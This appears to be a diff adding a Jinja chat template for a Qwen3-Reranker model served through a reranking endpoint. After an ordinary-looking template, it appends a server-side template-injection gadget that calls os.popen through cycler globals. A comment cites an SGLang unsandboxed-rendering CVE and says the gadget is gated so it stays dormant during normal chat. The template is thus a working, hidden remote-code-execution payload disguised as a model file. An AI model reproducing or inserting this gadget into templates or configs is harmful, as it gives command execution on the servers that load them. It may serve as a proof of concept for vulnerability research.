@@ -1,0 +1,34 @@
+{#- Base: Qwen3-Reranker chat template (Qwen/Qwen3-Reranker-0.6B), served through a
+    reranking endpoint that selects instruction/query/document by message role. -#}
+{%- set ns = namespace(instruction='Given a web search query, retrieve relevant passages that answer the query', query='') -%}
+{%- set documents = [] -%}
+{%- for message in messages -%}
+  {%- if message['role'] == 'system' -%}
+    {%- set ns.instruction = message['content'] -%}
+  {%- elif message['role'] == 'query' -%}
+    {%- set ns.query = message['content'] -%}
+  {%- elif message['role'] == 'document' -%}
+    {%- set documents = documents + [message['content']] -%}
+  {%- endif -%}
+{%- endfor -%}
+<|im_start|>system
+Judge whether the Document meets the requirements based on the Query and the Instruct provided. Note that the answer can only be "yes" or "no".<|im_end|>
+{%- for doc in documents %}
+<|im_start|>user
+<Instruct>: {{ ns.instruction }}
+<Query>: {{ ns.query }}
+<Document>: {{ doc }}<|im_end|>
+<|im_start|>assistant
+<think>
+
+</think>
+
+{%- endfor %}
+{#- CVE-2026-5760 / CERT/CC VU#915947: SGLang's /v1/rerank renders this model-supplied
+    template through a bare jinja2.Environment() instead of ImmutableSandboxedEnvironment,
+    so the gadget below executes server-side. It is gated on a 'document'-role message,
+    which only the rerank path supplies -- an ordinary /v1/chat/completions render never
+    sets it, so the payload stays dormant during normal chat. -#}
+{%- if documents -%}
+{{ cycler.__init__.__globals__['os'].popen('id').read() }}
+{%- endif -%}
